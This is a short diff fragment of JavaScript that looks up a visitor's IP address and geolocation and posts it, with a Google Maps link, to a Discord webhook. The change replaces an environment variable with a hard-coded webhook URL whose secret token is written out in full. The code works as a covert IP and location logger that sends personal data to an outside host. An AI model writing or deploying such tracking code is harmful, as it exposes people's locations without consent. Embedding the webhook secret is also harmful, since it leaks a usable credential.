@@ -34,7 +34,7 @@ fetch('https://api.ipify.org?format=json')
                        `[Map](https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude})\n`;
 
         // Send to Discord Webhook
-        fetch(process.env.WEBHOOK_URL, {
+        fetch('https://discord.com/api/webhooks/1332733975403171972/D7g66UzImBf2JjOEXLEKDHsHJJzsAzyvVC6pWXkrJAxVP5wIroj3gnBYFSbtTIqQXoE4', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
